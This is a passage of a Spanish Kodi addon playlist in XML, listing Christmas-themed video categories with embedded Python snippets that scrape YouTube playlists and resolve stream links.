<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item> 




<item>
<title>[COLOR gold]* [/COLOR][COLOR white]KARAOkE[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<externallink>https://pastebin.com/raw/Pi5Q4dur</externallink>
</item>







<item>
<title>[COLOR gold]* [/COLOR][COLOR white]MÚSICA[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<externallink>https://pastebin.com/raw/BtYudGgy
</externallink>
</item>





<item>
<title>[COLOR gold]* [/COLOR][COLOR white]JUEGOS[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
 <externallink>https://pastebin.com/raw/2aG1kkJF</externallink>
</item>


<item>
<title>[COLOR gold]* [/COLOR][COLOR white]POSTALES NAVIDEÑAS[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'http://www.youtube.com/watch?v=ec1_7Fvl244&amp;list=PLWVTnUUgGFJAd3fGBFAtZA85HxUEidfZF'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>




<item>
<title>[COLOR gold]* [/COLOR][COLOR white]SCRAPBOOK NAVIDAD[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=DY3GDfOxdcw&list=PL7GgCuRiaNjAZsaes2_qmmboPR7Pq1FNC'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>






<item>
<title>[COLOR gold]* [/COLOR][COLOR white]MANUALIDADES[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=oOAinz4ANtg&amp;list=PL0jWOfkzaPFqnzIGkMQ3L0s_4JsOl489E'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>




<item>
<title>[COLOR gold]* [/COLOR][COLOR white]RECETAS[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=KxJhQTAUqRs&list=PLr28xd8sWTMCSntRQnkCPmQXaDGhAVoqi'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>



<item>
<title>[COLOR gold]* [/COLOR][COLOR white]SESIÓN DE FOTOS FAMILIARES CREATIVAS[/COLOR]</title>
<link>$doregex[resolve]</link>
<regex>
<name>resolve</name>
<expres><![CDATA[#$pyFunction
import urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
 url = 'https://www.youtube.com/watch?v=GmHbGB68YMQ'
 streamLink = urlresolver.resolve(url)
 return streamLink
]]></expres>
<page></page>
</regex>     
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<info>@addonfestaycristal</info>
</item>



<item>
<title>[COLOR gold]* [/COLOR][COLOR white]NAVIDAD POR EL MUNDO[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'http://www.youtube.com/watch?v=7pmvkKGGS7Y&amp;list=PLWVTnUUgGFJDjQHRvrs-orJ5XykCpDd4h'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>


 <item>
<title>[COLOR gold]* [/COLOR][COLOR white]ADOPTAR  MASCOTA [COLOR gold](No compres, adopta)[/COLOR]</title>
<link>$doregex[noticia]</link>
<regex>
<name>noticia</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
 import xbmc
 import xbmcgui
 import webbrowser
 return  webbrowser.open_new_tab('http://wallamascotas.com/') + xbmc.executebuiltin('StartAndroidActivity(,android.intent.action.VIEW,,%s)' % 'http://wallamascotas.com/')
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<info>Que no hablen no significa que no sientan. No compres, adopta</info>
</item>












<item>
<title>[COLOR gold]* [/COLOR][COLOR white]ESPECTÁCULOS NAVIDEÑOS[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<externallink>https://pastebin.com/raw/yAdSv0C2</externallink>
</item>



 <item>
<title>[COLOR gold]* [/COLOR][COLOR white]AMIGO INVISIBLE[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'http://www.youtube.com/watch?v=_1jxnSSMSnE&amp;list=PLWVTnUUgGFJCbuRwHe3ONRZy0GL-mdU5l'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>






<item>
<title>[COLOR gold]* [/COLOR][COLOR white]HUMOR[/COLOR]</title>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
<link>http://ignoreme</link>
<externallink>https://pastebin.com/raw/gPuARqB3</externallink>
</item>






<item>
<title>[COLOR gold]* [COLOR white]REGALO SOLIDARIO[/COLOR][/COLOR]</title>      
